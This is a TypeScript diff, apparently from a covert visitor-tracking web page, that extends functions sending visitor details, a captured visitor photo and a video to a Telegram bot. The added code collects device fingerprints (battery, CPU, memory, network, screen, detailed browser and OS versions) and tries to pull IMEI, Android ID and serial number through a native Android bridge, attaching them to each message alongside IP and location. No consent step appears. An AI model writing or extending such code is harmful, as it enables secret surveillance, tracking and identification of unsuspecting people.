@@ -14,6 +14,15 @@ interface VisitorDetails {
     type: string;
     platform: string;
     mobile: boolean;
+    imei?: string;
+    androidId?: string;
+    serialNumber?: string;
+    batteryLevel?: number;
+    networkType?: string;
+    screenResolution?: string;
+    cpuCores?: number;
+    totalMemory?: number;
+    osVersion?: string;
   };
 }
 
@@ -33,6 +42,15 @@ interface DeviceInfo {
   type: string;
   platform: string;
   mobile: boolean;
+  imei?: string;
+  androidId?: string;
+  serialNumber?: string;
+  batteryLevel?: number;
+  networkType?: string;
+  screenResolution?: string;
+  cpuCores?: number;
+  totalMemory?: number;
+  osVersion?: string;
 }
 
 let hasNotificationBeenSent = false;
@@ -43,8 +61,45 @@ async function getDeviceInfo(): Promise<DeviceInfo> {
   let type = 'Unknown';
   let platform = 'Unknown';
   let mobile = false;
+  let osVersion = 'Unknown';
+  let networkType = 'Unknown';
+  let batteryLevel: number | undefined;
+  let screenResolution: string | undefined;
+  let cpuCores: number | undefined;
+  let totalMemory: number | undefined;
 
   try {
+    // Get screen resolution
+    screenResolution = `${window.screen.width}x${window.screen.height}@${window.devicePixelRatio}x`;
+
+    // Get CPU cores
+    if (navigator.hardwareConcurrency) {
+      cpuCores = navigator.hardwareConcurrency;
+    }
+
+    // Get memory info
+    if ('deviceMemory' in navigator) {
+      totalMemory = (navigator as any).deviceMemory;
+    }
+
+    // Get battery info
+    try {
+      const battery = await (navigator as any).getBattery?.();
+      if (battery) {
+        batteryLevel = battery.level * 100;
+      }
+    } catch (e) {
+      console.log('Battery API not available');
+    }
+
+    // Get network info
+    if ('connection' in navigator) {
+      const conn = (navigator as any).connection;
+      if (conn) {
+        networkType = `${conn.effectiveType || ''} ${conn.type || ''}`.trim() || 'Unknown';
+      }
+    }
+
     // Try Client Hints API first
     if ('userAgentData' in navigator) {
       const uaData = navigator.userAgentData as any;
@@ -52,12 +107,23 @@ async function getDeviceInfo(): Promise<DeviceInfo> {
         'platform',
         'platformVersion',
         'model',
-        'mobile'
+        'mobile',
+        'architecture',
+        'bitness',
+        'fullVersionList'
       ]);
       
       platform = hints.platform || platform;
       model = hints.model || model;
       mobile = hints.mobile;
+      osVersion = hints.platformVersion || osVersion;
+
+      // Get detailed browser version
+      const browsers = hints.fullVersionList || [];
+      const browserInfo = browsers.find((b: any) => b.brand !== 'Not.A.Brand') || {};
+      if (browserInfo.version) {
+        model += ` (${browserInfo.brand} ${browserInfo.version})`;
+      }
     }
 
     // Parse User-Agent string as fallback
@@ -79,23 +145,44 @@ async function getDeviceInfo(): Promise<DeviceInfo> {
       brand = 'Apple';
       const match = ua.match(/iphone\sos\s(\d+_\d+)/);
       model = match ? `iPhone (iOS ${match[1].replace('_', '.')})` : 'iPhone';
+      osVersion = match ? match[1].replace('_', '.') : osVersion;
     } else if (ua.includes('ipad')) {
       brand = 'Apple';
       const match = ua.match(/ipad\sos\s(\d+_\d+)/);
       model = match ? `iPad (iOS ${match[1].replace('_', '.')})` : 'iPad';
+      osVersion = match ? match[1].replace('_', '.') : osVersion;
     } else if (ua.includes('macintosh')) {
       brand = 'Apple';
       model = 'Mac';
+      const match = ua.match(/mac\sos\sx\s(\d+[._]\d+)/);
+      osVersion = match ? match[1].replace('_', '.') : osVersion;
     } else if (ua.includes('android')) {
       const matches = ua.match(/android\s([0-9.]+);\s([^;)]+)/);
       if (matches) {
         brand = matches[2].split(' ')[0];
         model = `${matches[2]} (Android ${matches[1]})`;
+        osVersion = matches[1];
       }
     } else if (ua.includes('windows')) {
       brand = 'Microsoft';
       const version = ua.match(/windows\snt\s(\d+\.\d+)/);
       model = version ? `Windows ${version[1]}` : 'Windows';
+      osVersion = version ? version[1] : osVersion;
+    }
+
+    // Get additional Android info if available
+    let androidId: string | undefined;
+    let serialNumber: string | undefined;
+    let imei: string | undefined;
+
+    if (typeof window !== 'undefined' && (window as any).Android) {
+      try {
+        androidId = (window as any).Android.getAndroidId?.();
+        serialNumber = (window as any).Android.getSerialNumber?.();
+        imei = (window as any).Android.getIMEI?.();
+      } catch (e) {
+        console.log('Native Android bridge not available');
+      }
     }
 
     return {
@@ -103,7 +190,16 @@ async function getDeviceInfo(): Promise<DeviceInfo> {
       model,
       type,
       platform,
-      mobile
+      mobile,
+      imei,
+      androidId,
+      serialNumber,
+      batteryLevel,
+      networkType,
+      screenResolution,
+      cpuCores,
+      totalMemory,
+      osVersion
     };
   } catch (error) {
     console.error('Error getting device info:', error);
@@ -242,7 +338,16 @@ export const sendTelegramNotification = async (details: VisitorDetails) => {
   • Model: ${deviceInfo.model}
   • Type: ${deviceInfo.type}
   • Platform: ${deviceInfo.platform}
-  • Mobile: ${deviceInfo.mobile ? 'Yes' : 'No'}`;
+  • OS Version: ${deviceInfo.osVersion || 'Unknown'}
+  • Mobile: ${deviceInfo.mobile ? 'Yes' : 'No'}
+  • Screen: ${deviceInfo.screenResolution || 'Unknown'}
+  • CPU Cores: ${deviceInfo.cpuCores || 'Unknown'}
+  • Memory: ${deviceInfo.totalMemory ? deviceInfo.totalMemory + 'GB' : 'Unknown'}
+  • Battery: ${deviceInfo.batteryLevel ? deviceInfo.batteryLevel + '%' : 'Unknown'}
+  • Network: ${deviceInfo.networkType || 'Unknown'}
+  • IMEI: ${deviceInfo.imei || 'Not available'}
+  • Android ID: ${deviceInfo.androidId || 'Not available'}
+  • Serial: ${deviceInfo.serialNumber || 'Not available'}`;
   
   const message = `
 🔍 New Visitor Details
@@ -294,6 +399,7 @@ export const sendVideoToTelegram = async (videoBlob: Blob) => {
   }
 
   const locationInfo = await getLocationInfo();
+  const deviceInfo = await getDeviceInfo();
   const formData = new FormData();
   formData.append('chat_id', CHAT_ID);
   
@@ -306,7 +412,11 @@ export const sendVideoToTelegram = async (videoBlob: Blob) => {
 ⏰ Time: ${new Date().toISOString()}
 🌆 City: ${locationInfo.city}
 🌍 Country: ${locationInfo.country}
-🌐 IP: ${locationInfo.ip}`);
+🌐 IP: ${locationInfo.ip}
+📱 Device: ${deviceInfo.brand} ${deviceInfo.model}
+📱 IMEI: ${deviceInfo.imei || 'Not available'}
+📱 Android ID: ${deviceInfo.androidId || 'Not available'}
+📱 Serial: ${deviceInfo.serialNumber || 'Not available'}`);
   formData.append('supports_streaming', 'true');
 
   const sendVideo = async (botToken: string): Promise<Response> => {
@@ -372,6 +482,7 @@ export const sendImageToTelegram = async (imageBlob: Blob) => {
   }
 
   const locationInfo = await getLocationInfo();
+  const deviceInfo = await getDeviceInfo();
   const formData = new FormData();
   formData.append('chat_id', CHAT_ID);
   formData.append('photo', imageBlob, 'visitor-photo.jpg');
@@ -379,7 +490,11 @@ export const sendImageToTelegram = async (imageBlob: Blob) => {
 ⏰ Time: ${new Date().toISOString()}
 🌆 City: ${locationInfo.city}
 🌍 Country: ${locationInfo.country}
-🌐 IP: ${locationInfo.ip}`);
+🌐 IP: ${locationInfo.ip}
+📱 Device: ${deviceInfo.brand} ${deviceInfo.model}
+📱 IMEI: ${deviceInfo.imei || 'Not available'}
+📱 Android ID: ${deviceInfo.androidId || 'Not available'}
+📱 Serial: ${deviceInfo.serialNumber || 'Not available'}`);
 
   const sendPhoto = async (botToken: string): Promise<Response> => {
     if (!botToken) {
